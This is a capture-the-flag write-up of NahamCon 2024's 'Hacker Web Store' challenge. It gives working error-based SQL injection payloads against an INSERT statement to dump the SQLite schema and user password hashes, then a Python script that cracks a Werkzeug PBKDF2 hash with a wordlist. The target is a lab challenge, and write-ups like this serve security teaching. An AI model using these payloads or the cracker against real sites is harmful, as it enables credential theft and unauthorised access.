# Hacker Web Store

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @colonneil, @jose.fk
- 254 solves / 183 points
- Author: @Jstith
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.  
  
_This challenge may require a local password list, which we have provided below. **Reminder, bruteforcing logins is not necessary and [against the rules.](https://ctf.nahamcon.com/rules)**_

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527120852.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527123928.png)

In here, we can view some products' details, such as the product name, price, and description.

**Create page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124037.png)

In here, looks like we can add a new product. Let's try to add a random product:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124208.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124224.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124333.png)

When we clicked the "Submit" button, it'll send a **POST request to `/create/` with parameter `name`, `price`, and `desc`**.

After that, our new product will be added to the server's database.

Also, did you noticed that **the response set a new session cookie for us**?

```http
[...]
Server: Werkzeug/3.0.1 Python/3.8.10
[...]
Set-Cookie: session=.eJxNjc0KgzAQhF8l3bMYkNIfb32GHkXCJrupUjXWXelBfPemh0JPwwfzzWzg4oDSsUDdbGA0B4wsgg-GAu5rCBkO5kbEZCZ-m3lJtAY1mgyhokfhEtq9LfLSwtJBHXEQLoC8m1Ezg-3SyDZotJLH-jS5nyk2XKk6VWeKR39x5Et5Db1-rzU9ecryfwH2D7irOys.ZlQPJA.qKfIIh7pJagV3sdMxgX1pVR2_as;
```

As you can see in the response header `Server`, the web server is using **[Werkzeug](https://werkzeug.palletsprojects.com/en/3.0.x/)** to host the application!

Based on my experience, the session cookie is a Flask session cookie and it's similar to JWT (JSON Web Token)!

**To decode the session cookie, we can use [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign):**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|12:58:12(HKT)]
└> flask-unsign --decode --cookie '.eJxNjc0KgzAQhF8l3bMYkNIfb32GHkXCJrupUjXWXelBfPemh0JPwwfzzWzg4oDSsUDdbGA0B4wsgg-GAu5rCBkO5kbEZCZ-m3lJtAY1mgyhokfhEtq9LfLSwtJBHXEQLoC8m1Ezg-3SyDZotJLH-jS5nyk2XKk6VWeKR39x5Et5Db1-rzU9ecryfwH2D7irOys.ZlQPJA.qKfIIh7pJagV3sdMxgX1pVR2_as'
{'_flashes': [('message', 'Success! Added new product to database.')], '_fresh': False, 'db_path': '/home/ctf/session_databases/c9d2627df4b8_db.sqlite', 'token': 'c9d2627df4b8'}
```

As you can see, the application using Flask's [message flashing](https://flask.palletsprojects.com/en/2.3.x/patterns/flashing/) to give feedback to us! In claim `_flashes`, we can see that the flashing message is "`Success! Added new product to database.`".

**Admin page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124455.png)

When we go to the admin page, if we're not authenticated, it'll redirect us to `/login?next=/admin`.

Let's make a random guess, maybe the admin credential is `admin:admin`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124631.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124652.png)

Nope, it seems wrong.

Hmm... Maybe we can try SQL injection to bypass the authentication?

A simple `' OR 1=1-- -` payload should do the job:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527124853.png)

Nope.

Alright, let's take a step back.

Since we can **insert a new product record** into the **database** via the `POST /create/` endpoint, we can try to probe for **SQL injection**.

**To do so, we can try to insert a single quotation mark (`'`) in one of those parameters:**
```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum'&price=69&desc=foobar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527130130.png)

**Decoded Flask session cookie:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|12:58:14(HKT)]
└> flask-unsign --decode --cookie '.eJxljk9Lw0AQxb_KMJe0sBgoEk168pCD4D9MFcSWMMlOTDDZrTsTUEq_u5ub4GV-PHhv3jth3Y0kPQsW7ycEjcCJReiD0WAZgg8wOKiUlCd2WsDtQ1U-7yJ2j_AUvJ1bFVg5mtjAMQxthGVp1_B6c_dSVrBK3vwc4H6eksRAkuXL7bxvKCTrLR7O5n-vYwqwxyzfYwHy45S-gZct0X4wcXNg6bHoaBQ2aJv6SBo1pr2fOG21SyX-GryrLSk1FFXa5naTba5sd9lc17a5kK9x0KVM_Se7GP5rwPMv4dVaiw.ZlQTjg.xWwEiDerpBwEcUToGgqPmNKs8Vs'
{'_flashes': [('message', "Error in Statement: INSERT INTO Products (name, price, desc) VALUES ('Your Mum'', '69', 'foobar');"), ('message', 'near "69": syntax error')], '_fresh': False, 'db_path': '/home/ctf/session_databases/c9d2627df4b8_db.sqlite', 'token': 'c9d2627df4b8'}
```

Oh! We got a **SQL syntax error**, and **the SQL statement is reflected**!

```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum'', '69', 'foobar');
```

Also, in the `db_path` claim, we can see that the database file extension is `.sqlite`, which means the web application is using **SQLite**!!

Now, let's "*fix*" the SQL syntax error via this payload:

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc=foobar');--+-
```

> Note: The payload is now moved to the `desc` parameter, otherwise we need to provide 2 more values.

In the above payload, we use the `'` to escape the single quotation mark. Then, the `);` is to close the `VALUES` clause. Finally, the `-- -` is a SQL comment, so that the rest of the original syntax will be ignored.

**Hence, the final SQL statement will become this:** 
```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', 'foobar');-- -');
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527131555.png)

**Decoded Flask session cookie:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|13:08:11(HKT)]
└> flask-unsign --decode --cookie '.eJxNjc0KgzAQhF8l3bMYkNIfb32GHkXCJrupUjXWXelBfPemh0JPwwfzzWzg4oDSsUDdbGA0B4wsgg-GAu5rCBkO5kbEZCZ-m3lJtAY1mgyhokfhEtq9LfLSwtJBHXEQLoC8m1Ezg-3SyDZotJLH-jS5nyk2XKk6VWeKR39x5Et5Db1-rzU9ecryfwH2D7irOys.ZlQVNQ.C3h1T_xL_qBHMthWP5-SpuX4u7Q' 
{'_flashes': [('message', 'Success! Added new product to database.')], '_fresh': False, 'db_path': '/home/ctf/session_databases/c9d2627df4b8_db.sqlite', 'token': 'c9d2627df4b8'}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527131633.png)

Ayy! No more errors!

That being said, the **`POST /create/` endpoint** is **indeed vulnerable to SQL injection**. More specifically, it's **error-based SQL injection**!

## Exploitation

Armed with above information, we can try to exploit the SQL injection vulnerability to exfiltrate the database's records!

To do so, we can use **subquery**!

> A subquery is a SQL query nested inside a larger query. - [https://www.w3resource.com/sqlite/sqlite-subqueries.php](https://www.w3resource.com/sqlite/sqlite-subqueries.php)

**Payload:**
```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+sqlite_version()));--+-
```

**Final executed SQL statement:**
```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT sqlite_version()));-- -');
```

In here, we use the `||` to concatenate an empty string with the value of the subquery, which is the SQLite version.

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527132332.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527132354.png)

Nice! It worked! The server uses SQLite version `3.31.1`!

Now, let's **enumerate the database's structure**!

According to [PayloadsAllTheThings SQLite Injection Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version), we can **get the database structure via table `sqlite_schema` or `sqlite_master`**.

**Payload:**
```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+sql+FROM+sqlite_master));--+-
```

**Final executed SQL statement:**
```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT sql FROM sqlite_master));-- -');
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527132812.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527132834.png)

Nice... Uh wait a minute... Since the product display page only shows 1 record per product, we only got 1 record in the database structure value.

To solve this issue, we can use the **`LIMIT` and `OFFSET` clause**, where we want to `LIMIT` 1 record only, and the get position of the record via `OFFSET`.

**Payloads:**
```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+sql+FROM+sqlite_master+LIMIT+1+OFFSET+0));--+-
```

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+sql+FROM+sqlite_master+LIMIT+1+OFFSET+1));--+-
```

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+sql+FROM+sqlite_master+LIMIT+1+OFFSET+2));--+-
```

**Final executed SQL statements:**
```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT sql FROM sqlite_master LIMIT 1 OFFSET 0));-- -');
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT sql FROM sqlite_master LIMIT 1 OFFSET 1));-- -');
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT sql FROM sqlite_master LIMIT 1 OFFSET 2));-- -');
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527133449.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527133532.png)

As you can see, `OFFSET 2` returned `None`, which means this offset has no records.

**Now we got database's structure!!**
```sql
CREATE TABLE users (
    id INTEGER NOT NULL, 
    name VARCHAR(100), 
    password VARCHAR(100) NOT NULL, 
    PRIMARY KEY (id)
)

CREATE TABLE products (
    id INTEGER NOT NULL, 
    name VARCHAR(100) NOT NULL, 
    price INTEGER, 
    desc TEXT, 
    PRIMARY KEY (id)
)
```

Hmm... The **table `users` looks juicy**, as it should holds some users' credentials!

Let's exfiltrate table `users` records!!

**Payloads:**
```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+name||'|'||password+FROM+users+LIMIT+1+OFFSET+0));--+-
```

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+name||'|'||password+FROM+users+LIMIT+1+OFFSET+1));--+-
```

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+name||'|'||password+FROM+users+LIMIT+1+OFFSET+2));--+-
```

```http
POST /create/ HTTP/1.1
Host: challenge.nahamcon.com:31903

name=Your+Mum&price=69&desc='||(SELECT+name||'|'||password+FROM+users+LIMIT+1+OFFSET+3));--+-
```

**Final executed SQL statements:**
```sql
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT name||'|'||password FROM users LIMIT 1 OFFSET 0));-- -');
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT name||'|'||password FROM users LIMIT 1 OFFSET 1));-- -');
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT name||'|'||password FROM users LIMIT 1 OFFSET 2));-- -');
INSERT INTO Products (name, price, desc) VALUES ('Your Mum', '69', ''||(SELECT name||'|'||password FROM users LIMIT 1 OFFSET 3));-- -');
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527134219.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527134235.png)

**Nice! We got all the users' credentials!**
```
Joram|pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
James|pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2b
website_admin_account|pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```

The username `website_admin_account` looks like an admin account!

However, the password is hashed via the **PBKDF2** password hashing function...

Hmm... Can we **crack those hashes**?

If we Google "`pbkdf2:sha256:600000`", we should see this [StackOverflow post](https://stackoverflow.com/questions/76935900/werkzeug-password-encryption):

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527134723.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527134742.png)

In this post, the author uses the **Werkzeug library's function `generate_password_hash`** to generate a password hash!

By reading the [official documentation](https://werkzeug.palletsprojects.com/en/3.0.x/utils/#werkzeug.security.generate_password_hash), looks like **the challenge's web application uses method `pbkdf2` to generate password hashes**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527135144.png)

Also, if we scroll down a bit, we can see the **[`check_password_hash` function](https://werkzeug.palletsprojects.com/en/3.0.x/utils/#werkzeug.security.check_password_hash)**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527135755.png)

With that said, let's crack `website_admin_account`'s password hash via the `check_password_hash` function!

**But wait, which password wordlist should we use? Luckily, the challenge provided a [wordlist](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/Web/Hacker-Web-Store/password_list.txt) for us!**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|13:56:45(HKT)]
└> file password_list.txt 
password_list.txt: Unicode text, UTF-8 text
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|13:59:11(HKT)]
└> head password_list.txt
!!!\\\\
"LANYHIA"
#sweet16#
&^#&#@
(teamokike20)
*25258093*
*hazardous*
+-*/963258741
...love<3
00-1689
```

Let's do this!

```python
#!/usr/bin/env python3
from werkzeug.security import check_password_hash

def crackPassword(hash, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            print(f'[*] Trying password "{password}"', end='\r')

            isCorrect = check_password_hash(hash, password)
            if not isCorrect:
                continue

            print(f'\n[+] Password hash "{hash}" is cracked! Password is "{password}"')
            exit(0)

if __name__ == '__main__':
    adminHash = 'pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57'
    wordlistPath = './password_list.txt'

    crackPassword(adminHash, wordlistPath)
```

However, my script didn't implement multi-threading, so it's a little bit slow. 

**If you want to crack the hash faster with multi-threading, you can use [Werkzeug Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker):**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|14:19:06(HKT)]
└> echo -n 'pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57' > hash.txt
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)-[2024.05.27|14:19:29(HKT)]
└> python3 /opt/Werkzeug-Cracker/werkzeug_cracker.py -p ./hash.txt -w password_list.txt -t 50
Countdown |█████████████████████▊          | 1361/2008

Password found: ntadmin1234
```

Nice! We successfully cracked the admin account's password: `ntadmin1234`! Let's login to the admin page!

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527142234.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527142240.png)

We got the flag!

- **Flag: `flag{87257f24fd71ea9ed8aa62837e768ec0}`**

## Conclusion

What we've learned:

1. SQL injection